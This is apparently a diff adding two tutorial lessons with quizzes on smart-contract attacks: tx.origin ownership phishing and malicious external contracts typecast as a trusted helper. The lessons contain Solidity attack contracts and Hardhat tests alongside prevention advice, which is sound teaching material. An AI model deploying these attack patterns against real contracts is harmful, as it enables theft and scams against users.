@@ -1,4 +1,5 @@
-# attack prevention-re-entrancy-privacy-delegateCall-dos
+# security-attack prevention
+re-entrancy-privacy-delegateCall-dos-txorigin-etc
 LearnWeb3 tutorial for preventing attacks
 
 Lesson Type: Quiz
@@ -915,3 +916,350 @@ Yes
 No
 Refereces
 Solidity by example
+
+
+Lesson Type: Quiz
+Estimated Time: 1-2 hours
+Current Score: 100%
+Attack with tx.origin
+tx.origin is a global variable which returns the address that created the original transaction. It is kind of similar to msg.sender, but with an important caveat. We will learn how incorrect use of tx.origin could lead to security vulnerabilities in smart contracts.
+
+🤔 What is tx.origin?
+
+
+It is a global variable
+
+it is a local variable
+
+it is a function
+Lets goo 🚀
+
+What is tx.origin?
+tx.origin is a global variable which returns the address of the account which sent the transaction. Now you might be wondering then what is msg.sender 🤔. The difference is that tx.origin refers to the original external account (which is the user) that started the transaction and msg.sender is the immediate account that called the function and it can be an external account or another contract calling the function.
+
+So for example, if User calls Contract A, which then calls contract B within the same transaction, msg.sender will be equal to Contract A when checked from inside Contract B. However, tx.origin will be the User regardless of where you check it from.
+
+🤔 Difference between tx.origin and msg.sender?
+
+
+tx.origin refers to the immediate account that called the function whereas msg.sender refers to the original external account that started the transaction
+
+msg.sender refers to the immediate account that called the function whereas tx.origin refers to the original external account that started the transaction
+
+They both are the same
+🤔 Can msg.sender and tx.origin have the same value sometimes?
+
+
+No
+
+Yes
+DOS Attack on a smart contract
+What will happen?
+There will be two smart contracts - Good.sol and Attack.sol. Good.sol. Initially the owner of Good.sol will be a good user. Using the attack function Attack.sol will be able to change the owner of Good.sol to itself.
+
+Build
+Lets build an example where you can experience how the the attack happens.
+
+To setup a Hardhat project, Open up a terminal and execute these commands
+
+npm init --yes
+npm install --save-dev hardhat
+If you are not on mac, please do this extra step and install these libraries as well :)
+
+npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
+In the same directory where you installed Hardhat run:
+
+npx hardhat
+Select Create a basic sample project
+Press enter for the already specified Hardhat Project root
+Press enter for the question on if you want to add a .gitignore
+Press enter for Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?
+Now you have a hardhat project ready to go!
+
+First, let's create a contract named Good.sol which is essentially a simpler version of Ownable.sol that we have previously used.
+
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+
+contract Good  {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function setOwner(address newOwner) public {
+        require(tx.origin == owner, "Not owner" );
+        owner = newOwner;
+    }
+}
+Now, create a contract named Attack.sol within the contracts directory and write the following lines of code
+
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+import "./Good.sol";
+
+contract Attack {
+    Good public good;
+    constructor(address _good) {
+        good = Good(_good);
+    }
+
+    function attack() public {
+        good.setOwner(address(this));
+    }
+}
+Now lets try immitating the attack using a sample test, create a new file under test folder named attack.js and add the following lines of code to it
+
+const { expect } = require("chai");
+const { BigNumber } = require("ethers");
+const { ethers, waffle } = require("hardhat");
+
+describe("Attack", function () {
+  it("Attack.sol will be able to change the owner of Good.sol", async function () {
+    // Get one address
+    const [_, addr1] = await ethers.getSigners();
+
+    // Deploy the good contract
+    const goodContract = await ethers.getContractFactory("Good");
+    const _goodContract = await goodContract.connect(addr1).deploy();
+    await _goodContract.deployed();
+    console.log("Good Contract's Address:", _goodContract.address);
+
+    // Deploy the Attack contract
+    const attackContract = await ethers.getContractFactory("Attack");
+    const _attackContract = await attackContract.deploy(_goodContract.address);
+    await _attackContract.deployed();
+    console.log("Attack Contract's Address", _attackContract.address);
+
+    let tx = await _attackContract.connect(addr1).attack();
+    await tx.wait();
+
+    // Now lets check if the current owner of Good.sol is actually Attack.sol
+    expect(await _goodContract.owner()).to.equal(_attackContract.address);
+  });
+});
+The attack will happen as follows, initially addr1 will deploy Good.sol and will be the owner but the attacker will somehow fool the user who has the private key of addr1 to call the attack function with Attack.sol.
+
+When the user calls attack function with addr1, tx.origin is set to addr1. attack function further calls setOwner function of Good.sol which first checks if tx.origin is indeed the owner which is true because the original transaction was indeed called by addr1. After verifying the owner, it sets the owner to Attack.sol
+
+And thus attacker is successfully able to change the owner of Good.sol 🤯
+
+To run the test, in your terminal pointing to the root directory of this level execute the following command
+
+npx hardhat test
+When the tests pass, you will notice that the owner of Good.sol is now Attack.sol
+
+Real Life Example
+While this may seem obvious to most of you, as tx.origin isn't something you see being used at all, some developers do make this mistake. You can read about the THORChain Hack #2 here where users lost millions in $RUNE due to an attacker being able to get approvals on $RUNE token by sending a fake token to user's wallets, and approving that token for sale on Uniswap would transfer $RUNE from the user's wallet to the attacker's wallet because THORChain used tx.origin for transfer checks instead of msg.sender.
+
+🤔 Is it better to use msg.sender or tx.origin?
+
+
+msg.sender is better
+
+tx.origin is better
+Prevention
+You should use msg.sender instead of tx.origin to not let this happen
+Example:
+
+function setOwner(address newOwner) public {
+    require(msg.sender == owner, "Not owner" );
+    owner = newOwner;
+}
+Hope you liked this level ❤️, keep building.
+
+WAGMI 🚀
+
+🤔 Is the following contract vulnerable to a tx.origin attack?
+
+Is the following contract vulnerable to a tx.origin attack?
+
+By fooling the original winner to call the attack function in Attack.sol
+
+By calling attack function
+
+By calling the setWinner
+References
+Solidity by example
+
+Lesson Type: Quiz
+Estimated Time: 1-2 hours
+Current Score: 0%
+Malicious External Contracts
+In crypto world, you will often hear about how contracts which looked legitimate were the reason behind a big scam. How are hackers able to execute malicious code from a legitimate looking contract?
+
+We will learn one method today 👀
+
+What will happen?
+There will be three contracts - Attack.sol, Helper.sol and Good.sol. User will be able to enter an eligibility list using Good.sol which will further call Helper.sol to keep track of all the users which are eligible.
+
+Attack.sol will be designed in such a way that eligibility list can be manipulated, lets see how 👀
+
+Build
+Lets build an example where you can experience how the attack happens.
+
+To setup a Hardhat project, Open up a terminal and execute these commands
+
+npm init --yes
+npm install --save-dev hardhat
+If you are on Windows, please do this extra step and install these libraries as well :)
+
+npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
+In the same directory where you installed Hardhat run:
+
+npx hardhat
+Select Create a basic sample project
+Press enter for the already specified Hardhat Project root
+Press enter for the question on if you want to add a .gitignore
+Press enter for Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?
+Now you have a Hardhat project ready to go!
+
+Start by creating a new file inside the contracts directory called Good.sol
+
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+import "./Helper.sol";
+
+contract Good {
+    Helper helper;
+    constructor(address _helper) payable {
+        helper = Helper(_helper);
+    }
+
+    function isUserEligible() public view returns(bool) {
+        return helper.isUserEligible(msg.sender);
+    }
+
+    function addUserToList() public  {
+        helper.setUserEligible(msg.sender);
+    }
+
+    fallback() external {}
+    
+}
+After creating Good.sol, create a new file inside the contracts directory named Helper.sol
+
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+contract Helper {
+    mapping(address => bool) userEligible;
+
+    function isUserEligible(address user) public view returns(bool) {
+        return userEligible[user];
+    }
+
+    function setUserEligible(address user) public {
+        userEligible[user] = true;
+    }
+
+    fallback() external {}
+}
+The last contract that we will create inside the contracts directory is Attack.sol
+
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+contract Attack {
+    address owner;
+    mapping(address => bool) userEligible;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function isUserEligible(address user) public view returns(bool) {
+        if(user == owner) {
+            return true;
+        }
+        return false;
+    }
+
+    function setUserEligible(address user) public {
+        userEligible[user] = true;
+    }
+    
+    fallback() external {}
+}
+You will notice that the fact about Attack.sol is that it will generate the same ABI as Helper.sol eventhough it has different code within it. This is because ABI only contains function definitions for public variables, functions and events. So Attack.sol can be typecasted as Helper.sol.
+
+Now because Attack.sol can be typecasted as Helper.sol, a malicious owner can deploy Good.sol with the address of Attack.sol instead of Helper.sol and users will believe that he is indeed using Helper.sol to create the eligibility list.
+
+In our case, the scam will happen as follows. The scammer will first deploy Good.sol with the address of Attack.sol. Then when the user will enter the eligibility list using addUserToList function which will work fine because the code for this function is same within Helper.sol and Attack.sol.
+
+The true colours will be observed when the user will try to call isUserEligible with his address because now this function will always return false because it calls Attack.sol's isUserEligible function which always returns false except when its the owner itself, which was not supposed to happen.
+
+Lets try to write a test and see if this scam actually works, create a new file inside the test folder named attack.js
+
+const { expect } = require("chai");
+const { BigNumber } = require("ethers");
+const { ethers, waffle } = require("hardhat");
+
+describe("Attack", function () {
+  it("Should change the owner of the Good contract", async function () {
+    // Deploy the Attack contract
+    const attackContract = await ethers.getContractFactory("Attack");
+    const _attackContract = await attackContract.deploy();
+    await _attackContract.deployed();
+    console.log("Attack Contract's Address", _attackContract.address);
+
+    // Deploy the good contract
+    const goodContract = await ethers.getContractFactory("Good");
+    const _goodContract = await goodContract.deploy(_attackContract.address, {
+      value: ethers.utils.parseEther("3"),
+    });
+    await _goodContract.deployed();
+    console.log("Good Contract's Address:", _goodContract.address);
+
+    const [_, addr1] = await ethers.getSigners();
+    // Now lets add an address to the eligibility list
+    let tx = await _goodContract.connect(addr1).addUserToList();
+    await tx.wait();
+
+    // check if the user is eligible
+    const eligible = await _goodContract.connect(addr1).isUserEligible();
+    expect(eligible).to.equal(false);
+  });
+});
+To run this test, open up your terminal pointing to the root of the directory for this level and execute this command:
+
+npx hardhat test
+If all your tests passed, this means that the scam was successful and that the user will never be determined eligible
+
+Prevention
+Make the address of the external contract public and also get your external contract verified so that all users can view the code
+
+Create a new contract, instead of typecasting an address into a contract inside the constructor. So instead of doing Helper(_helper) where you are typecasting _helper address into a contract which may or may not be the Helper contract, create an explicit new helper contract instance using new Helper().
+
+Example
+
+contract Good {
+    Helper public helper;
+    constructor() {
+        helper = new Helper();
+    }
+🤔 How do you make sure that your contract is trusted by your users?
+
+
+Get your contract and external contract verified on etherscan
+
+Make sure your contract's code is not verified on etherscan
+
+Make sure your contract's code is verified but the external contract you are calling from your contract is not verified on etherscan
+🤔 How can a malicious actor prevent users from joining the whitelist even though the user calls the `addUserToWhitelist` function in Good.sol?
+
+How can a malicious actor prevent users from joining the whitelist even though the user calls the `addUserToWhitelist` function in Good.sol?
+
+He can't prevent it
+
+He can add malicious code inside the helper contract
+
+He can block the UI through which the user is calling `Good.sol` contract
+Wow, lots of learning right? 🤯
+
+Beaware of scammers, you might need to double check the code of a new dApp you want to put money in.
+
+Submit Quiz
